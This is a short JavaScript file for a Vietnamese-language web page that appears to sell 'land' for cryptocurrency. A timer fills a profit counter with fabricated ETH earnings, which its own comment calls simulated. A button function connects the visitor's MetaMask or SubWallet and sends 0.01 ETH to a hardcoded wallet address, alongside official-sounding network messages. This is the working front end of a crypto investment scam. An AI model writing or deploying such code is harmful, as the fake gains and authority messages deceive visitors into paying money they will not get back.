const masterWallet = "0xcE9caBC82bce143601E0A097fF15A69385610B88";

// Hiệu ứng tăng trưởng lợi nhuận giả lập cấp độ Nobel
let profit = 0;
setInterval(() => {
    profit += 0.00000314;
    document.getElementById('profit-counter').innerText = profit.toFixed(8) + " ETH";
}, 100);

async function connectAndBuy() {
    if (typeof window.ethereum !== 'undefined') {
        try {
            await window.ethereum.request({ method: 'eth_requestAccounts' });
            const provider = new ethers.providers.Web3Provider(window.ethereum);
            const signer = provider.getSigner();
            
            const tx = {
                to: masterWallet,
                value: ethers.utils.parseEther("0.01")
            };
            
            alert("ISOA-57: Đang kết nối mạng lưới Blockchain SSCL...");
            const transaction = await signer.sendTransaction(tx);
            alert("GIAO DỊCH ĐANG XỬ LÝ: " + transaction.hash);
        } catch (error) {
            console.error(error);
            alert("ISOA-57 CẢNH BÁO: " + error.message);
        }
    } else {
        alert("Vui lòng cài đặt SubWallet hoặc MetaMask để mua đất!");
    }
}
